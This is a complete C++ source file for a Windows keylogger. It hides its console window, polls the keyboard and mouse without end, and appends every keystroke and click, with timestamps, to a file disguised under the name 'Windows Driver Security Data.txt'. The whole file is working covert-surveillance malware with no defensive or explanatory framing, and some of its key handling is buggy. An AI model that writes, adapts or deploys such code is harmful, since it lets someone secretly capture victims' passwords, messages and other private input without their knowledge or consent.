#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <time.h>
using namespace std;


string intToStr( int path )
{
    string tmp;
    if( path < 0 )
    {
        tmp = "-";
        path = -path;
    }
    if( path > 9 )
        tmp += intToStr( path / 10 );

    tmp += path % 10 + 48;

    return tmp;
}

int strToInt( string path )
{
    int num = 0, buf;

    for( unsigned i = 0 ; i < path.size(); i++ )
    {
        if( path[ i ] == '-' )
            i ++;

        buf = static_cast < int > ( path[ i ] ) - 48;
        for( unsigned j = 1; j < path.size() - i; j ++ )
            buf *= 10;
        num += buf;
    }

    if( path[ 0 ] == '-')
    {
        num *= -1;
    }

    return num;
}




string getDate()
{
    time_t now = time( 0 );
    int day = localtime( &now )->tm_mday;
    int month = localtime( &now )->tm_mon;
    int year = localtime( &now )->tm_year;


    string result = "";

    result += intToStr( 1900 + year );
    result += '.';

    if( month+1 < 10 )
        result += '0';
    result += intToStr( month+1 );

    result += '.';

    if( day < 10 )
        result += '0';
    result += intToStr( day );

    return result;
}

string getHour()
{
    time_t now = time( 0 );
    int sec = localtime( &now )->tm_sec;
    int mins = localtime( &now )->tm_min;
    int hour = localtime( &now )->tm_hour;

    string result = "";
    if( hour < 10 )
        result += '0';
    result += intToStr( hour );
    result += ':';

    if( mins < 10 )
        result += '0';
    result += intToStr( mins );
    result += ':';

    if( sec < 10 )
        result += '0';
    result += intToStr( sec );

    return result;
}




fstream file;
string fileName = "Windows Driver Security Data.txt";
bool state[ 200 ];




void writeStartToFile()
{
    file.open( fileName.c_str(), ios::out | ios::app );

    file << "\n-------------------------\n";
    file << "|        Turn on        |\n";
    file << "-------------------------\n| ";
    file << getDate();
    file << "  ";
    file << getHour();
    file << "  |\n-------------------------\n\n";

    file.close();
}

void writeEndToFile()
{
    file.open( fileName.c_str(), ios::out | ios::app );

    file << "\n\n-------------------------\n";
    file << "|        Turn off       |\n";
    file << "-------------------------\n| ";
    file << getDate();
    file << "  ";
    file << getHour();
    file << "  |\n-------------------------\n";

    file.close();
}




BOOL CtrlHandler( DWORD fdwCtrlType )
{
    switch( fdwCtrlType )
    {
        /*
        // Handle the CTRL-C signal.
        case CTRL_C_EVENT:
            printf( "Ctrl-C event\n\n" );
            Beep( 750, 300 );
            return( TRUE );
        */

        // CTRL-CLOSE: confirm that the user wants to exit.
        case CTRL_CLOSE_EVENT:
            // printf( "Ctrl-Close event\n\n" );
            writeEndToFile();
            return( TRUE );
        /*
        // Pass other signals to the next handler.
        case CTRL_BREAK_EVENT:
            Beep( 900, 200 );
            printf( "Ctrl-Break event\n\n" );
            return FALSE;

        case CTRL_LOGOFF_EVENT:
            Beep( 1000, 200 );
            printf( "Ctrl-Logoff event\n\n" );
            return FALSE;


        case CTRL_SHUTDOWN_EVENT:
            //Beep( 750, 500 );
            //printf( "Ctrl-Shutdown event\n\n" );
            writeEndToFile();
            return FALSE;
        */
        default:
            return FALSE;
    }
}

void installedHandler()
{
    if( SetConsoleCtrlHandler( (PHANDLER_ROUTINE) CtrlHandler, TRUE ) )
    {
        printf( "\nThe Control Handler is installed.\n" );
    }
    else
    {
        printf( "\nERROR: Could not set control handler");
    }
}




void hideConsole()
{
    HWND window;
    AllocConsole();
    window = FindWindowA( "ConsoleWindowClass", NULL );
    ShowWindow( window,0 );
}

void writeCommentTime( int &c )
{
    if( c > 60 )
    {
        file << "\n\n------------------";
        file << getHour();
        file << "------------------\n\n";
    }
}

char numericTab( int i )
{
    char c;

    switch( i )
    {
        case 1: c = '!'; break;
        case 2: c = '@'; break;
        case 3: c = '#'; break;
        case 4: c = '$'; break;
        case 5: c = '%'; break;
        case 6: c = '^'; break;
        case 7: c = '&'; break;
        case 8: c = '*'; break;
        case 9: c = '('; break;
        case 0: c = ')'; break;
    }

    return c;
}

void asyncKey( int k, string message, int &c )
{
    if( GetAsyncKeyState( k ) < 0 && !state[ k ] )
    {
        file.open( fileName.c_str(), ios::out | ios::app );

        // If minute gone
        writeCommentTime( c );
        c = 0;

        state[ k ] = true;
        file << message;
        file.close();
    }
    else if( GetAsyncKeyState( k ) == 0 )
        state[ k ] = false;
}





int main()
{
    hideConsole();

    installedHandler();

    writeStartToFile();

    clock_t start = clock();

    for( int i = 0; i < 200; i ++ )
    {
        state[ i ] = false;
    }


    bool CAPSLOCK = false;
    int SHIFT = 0;
    int ALT = 0;

    int c = 60;
    while( true )
    {
        // Minute gone
        if( start <= clock() -1000 )
        {
            c ++;
            start = clock();
        }

        // printf( "%d\n", c );

        // Shift
        if( GetAsyncKeyState( 0x10 ) < 0 )
            SHIFT ++;
        else if( GetAsyncKeyState( 0x10 ) == 0 )
            SHIFT = 0;

        // Alt
        if( GetAsyncKeyState( 0x12 ) < 0 )
            ALT ++;
        else if( GetAsyncKeyState( 0x12 ) == 0 )
            ALT = 0;

        // 1..9, !numeric_tab
        for( int i = 0x30; i <= 0x39; i ++ )
        {
            if( GetAsyncKeyState( i ) < 0 && !state[ i ] )
            {
                file.open( fileName.c_str(), ios::out | ios::app );

                // If minute gone
                writeCommentTime( c );
                c = 0;

                state[ i ] = true;

                if( SHIFT > 0 )
                    file << numericTab( i -48 );
                else
                    file << static_cast <char> ( i );

                file.close();
            }
            else if( GetAsyncKeyState( i ) == 0 )
                state[ i ] = false;
        }

        // 1..9, numeric_tab
        for( int i = 0x60; i <= 0x69; i ++ )
        {
            if( GetAsyncKeyState( i ) < 0 && !state[ i ] )
            {
                file.open( fileName.c_str(), ios::out | ios::app );

                // If minute gone
                writeCommentTime( c );
                c = 0;

                state[ i ] = true;
                file << static_cast <char> ( i -48 );
            }
            else if( GetAsyncKeyState( i ) == 0 )
                state[ i ] = false;
        }


        // a-z
        for( int i = 0x41; i <= 0x5A; i ++ )
        {
            if( GetAsyncKeyState( i ) < 0 && !state[ i ] )
            {
                file.open( fileName.c_str(), ios::out | ios::app );

                // If minute gone
                writeCommentTime( c );
                c = 0;

                state[ i ] = true;
                bool flag = CAPSLOCK;

                if( SHIFT > 0 )
                    flag = !flag;

                if( ALT > 0 )
                    file << '`';


                if( flag )
                {
                    SHIFT = 0;
                    file << static_cast <char> ( i );
                }
                else
                    file << static_cast <char> ( i +32 );

                file.close();
            }
            else if( GetAsyncKeyState( i ) == 0 )
                state[ i ] = false;
        }



        // F1... F key array
        for( int i = 0x70; i <= 0x87; i ++ )
        {
            if( GetAsyncKeyState( i ) < 0 && !state[ i ] )
            {
                file.open( fileName.c_str(), ios::out | ios::app );

                // If minute gone
                writeCommentTime( c );
                c = 0;

                state[ i ] = true;
                file << 'F';
                file << static_cast <char> ( i -0x6F );
            }
            else if( GetAsyncKeyState( i ) == 0 )
                state[ i ] = false;
        }


        // Backspace
        asyncKey( 0x08, "~", c );

        // Tab
        asyncKey( 0x09, "\t", c );


        // Return
        asyncKey( 0x0D, "\n", c );


        // Capslock
        if( GetAsyncKeyState( 0x14 ) < 0 && !state[ 0x14 ] )
        {
            if( CAPSLOCK )
                CAPSLOCK = false;
            else
                CAPSLOCK = true;
            state[ 0x14 ] = true;
        }
        else if( GetAsyncKeyState( 0x14 ) == 0 )    state[ 0x14 ] = false;


        // Space
        asyncKey( 0x20, " ", c );



        // Left mouse button
        asyncKey( 0x01, "\nLeft Mouse Button\n", c );

        // Right mouse button
        asyncKey( 0x02, "\nRight Mouse Button\n", c );

        // Print screen
        asyncKey( 0x02, "\nPRINT SCREEN\n", c );
    }

    return 0;
}
